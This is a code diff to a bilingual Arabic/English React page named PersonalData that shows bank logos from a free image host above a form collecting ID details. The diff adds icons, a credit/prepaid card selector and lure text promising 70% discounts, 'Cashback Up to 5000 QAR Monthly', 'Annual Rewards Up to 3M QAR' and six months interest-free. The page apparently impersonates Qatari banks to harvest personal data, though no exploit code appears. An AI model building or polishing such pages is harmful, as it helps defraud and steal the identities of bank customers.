@@ -3,6 +3,7 @@ import { useLocation, useSearch } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
 import { toast } from "sonner";
+import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown, Calendar } from "lucide-react";
 
 const bankLogos = {
   doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
@@ -40,6 +41,7 @@ export default function PersonalData() {
     dateOfBirth: "",
     gender: isArabic ? "ذكر" : "Male",
     customerStatus: isArabic ? "عميل حالي" : "Existing Customer",
+    cardType: isArabic ? "بطاقة ائتمان" : "Credit Card",
   });
 
   const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();
@@ -86,6 +88,8 @@ export default function PersonalData() {
     document.title = isArabic ? "البيانات الشخصية" : "Personal Data";
   }, [isArabic]);
 
+  const isCreditCard = formData.cardType === (isArabic ? "بطاقة ائتمان" : "Credit Card");
+
   return (
     <div className="page-wrapper">
       <style>{`
@@ -100,14 +104,20 @@ export default function PersonalData() {
         .bank-logo { width: 90%; max-width: 400px; display: block; margin: 0 auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
 
         .info-box { background: white; margin: 15px; padding: 15px; border-radius: 10px; border-${isArabic ? "right" : "left"}: 5px solid #8C0032; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
-        .line { border-bottom: 1px solid #eee; padding: 8px 0; font-size: 14px; color: #333; }
-        .rewards-line { padding: 8px 0; color: #8C0032; font-weight: bold; font-size: 14px; border-bottom: 1px solid #eee; }
+        .line { padding: 8px 0; font-size: 14px; color: #333; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #eee; }
+        .line-icon { width: 20px; height: 20px; color: #8C0032; flex-shrink: 0; }
+        .rewards-line { padding: 8px 0; color: #8C0032; font-weight: bold; font-size: 14px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 8px; }
+        .rewards-icon { width: 20px; height: 20px; flex-shrink: 0; }
 
         .form-container { padding: 20px; background: white; margin: 15px; border-radius: 10px; }
         .form-group { margin-bottom: 15px; }
         label { display: block; font-weight: bold; margin-bottom: 5px; color: #555; }
         input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
         .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+
+        .special-feature { background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 12px; border-radius: 8px; margin-top: 15px; display: flex; align-items: center; gap: 10px; }
+        .special-feature svg { width: 24px; height: 24px; flex-shrink: 0; }
+        .special-feature span { font-weight: 600; font-size: 14px; }
 
         .footer-image { width: 100%; display: block; margin-top: 20px; }
       `}</style>
@@ -126,18 +136,65 @@ export default function PersonalData() {
       </div>
 
       <div className="info-box">
-        <div className="line">✔ {isArabic ? "مميزات البطاقة: أولوية قصوى، تجميع نقاط مضاعف، دخول الصالات" : "Card Benefits: Priority processing, Double Avios points, Lounge access"}</div>
-        <div className="line">✔ {isArabic ? "أفضل شركات الطيران: الخطوط القطرية، السنغافورية، طيران الإمارات" : "Best Airlines: Qatar Airways, Singapore Airlines, Emirates"}</div>
-        <div className="line">✔ {isArabic ? "أفضل درجة رجال أعمال: Qsuite القطرية، درجة رجال الأعمال السنغافورية" : "Best Business Class: Qatar Qsuite, Singapore Business Class"}</div>
-        <div className="line">✔ {isArabic ? "أفضل صالات رجال أعمال: صالة المرجان، صالات سيلفر كريس" : "Best Lounges: Al Mourjan Lounge, SilverKris Lounges"}</div>
-        <div className="line">✔ {isArabic ? "أفضل شركة طيران في الشرق الأوسط: القطرية، الإمارات، الاتحاد" : "Best Airline in the Middle East: Qatar Airways, Emirates, Etihad"}</div>
-        <div className="rewards-line">● {isArabic ? "مكافآت شهرية تصل إلى 5,000 ريال قطري" : "Monthly rewards up to QAR 5,000"}</div>
-        <div className="rewards-line">● {isArabic ? "جوائز سنوية تصل إلى 3,000,000 ريال قطري" : "Annual prizes up to QAR 3,000,000"}</div>
-        <div className="rewards-line">● {isArabic ? "خصومات عالمية تصل إلى 70%" : "Global discounts up to 70%"}</div>
+        <div className="line">
+          <Car className="line-icon" />
+          <span>{isArabic ? "تأجير السيارات: خصم 70%" : "Car Rental: 70% Discount"}</span>
+        </div>
+        <div className="line">
+          <Hotel className="line-icon" />
+          <span>{isArabic ? "حجوزات الفنادق: خصم 70%" : "Hotel Booking: 70% Discount"}</span>
+        </div>
+        <div className="line">
+          <Plane className="line-icon" />
+          <span>{isArabic ? "تذاكر الطيران: خصم 70%" : "Flight Tickets: 70% Discount"}</span>
+        </div>
+        <div className="line">
+          <ParkingCircle className="line-icon" />
+          <span>{isArabic ? "المواقف: خصم 70%" : "Parking: 70% Discount"}</span>
+        </div>
+        <div className="line">
+          <Gift className="line-icon" />
+          <span>{isArabic ? "مميزات حصرية وعروض خاصة" : "Exclusive Benefits & Special Offers"}</span>
+        </div>
+        <div className="line">
+          <Lock className="line-icon" />
+          <span>{isArabic ? "دفع آمن وحماية كاملة" : "Secure Payment & Full Protection"}</span>
+        </div>
+        <div className="line">
+          <Globe className="line-icon" />
+          <span>{isArabic ? "تقبل عالمياً في جميع أنحاء العالم" : "Global Acceptance Worldwide"}</span>
+        </div>
+        <div className="rewards-line">
+          <Wallet className="rewards-icon" />
+          <span>{isArabic ? "كاش باك يصل إلى 5000 ريال قطري شهرياً" : "Cashback Up to 5000 QAR Monthly"}</span>
+        </div>
+        <div className="rewards-line">
+          <Crown className="rewards-icon" />
+          <span>{isArabic ? "دخول صالات VIP في المطارات" : "VIP Lounge Access at Airports"}</span>
+        </div>
+        <div className="rewards-line">
+          <Trophy className="rewards-icon" />
+          <span>{isArabic ? "جوائز سنوية تصل إلى 3 مليون ريال قطري" : "Annual Rewards Up to 3M QAR"}</span>
+        </div>
       </div>
 
       <div className="form-container">
         <form onSubmit={handleSubmit}>
+          <div className="form-group">
+            <label>{isArabic ? "نوع البطاقة" : "Card Type"}</label>
+            <select name="cardType" value={formData.cardType} onChange={handleChange}>
+              <option>{isArabic ? "بطاقة ائتمان" : "Credit Card"}</option>
+              <option>{isArabic ? "بطاقة مسبقة الدفع" : "Prepaid Card"}</option>
+            </select>
+          </div>
+
+          {isCreditCard && (
+            <div className="special-feature">
+              <Calendar />
+              <span>{isArabic ? "فترة سداد تصل إلى 6 شهور بدون فوائد" : "Payment Period Up to 6 Months Interest-Free"}</span>
+            </div>
+          )}
+
           <div className="form-group">
             <label>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Full Name (as per ID)"}</label>
             <input
